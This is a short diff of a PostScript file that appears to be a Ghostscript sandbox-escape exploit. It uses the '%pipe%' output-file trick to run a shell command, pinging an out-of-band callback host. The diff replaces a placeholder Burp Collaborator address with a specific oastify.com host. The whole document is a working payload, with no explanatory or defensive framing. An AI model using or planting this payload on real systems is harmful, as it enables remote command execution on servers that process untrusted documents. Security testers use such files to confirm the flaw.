@@ -7,4 +7,4 @@ legal
 { null restore } stopped { pop } if
 { legal } stopped { pop } if
 restore
-mark /OutputFile (%pipe%ping -c 10 your.burp.collab.com) currentdevice putdeviceprops
+mark /OutputFile (%pipe%ping -c 10 pxqqhiybbaz8k06abswhnizmvd14pudj.oastify.com) currentdevice putdeviceprops
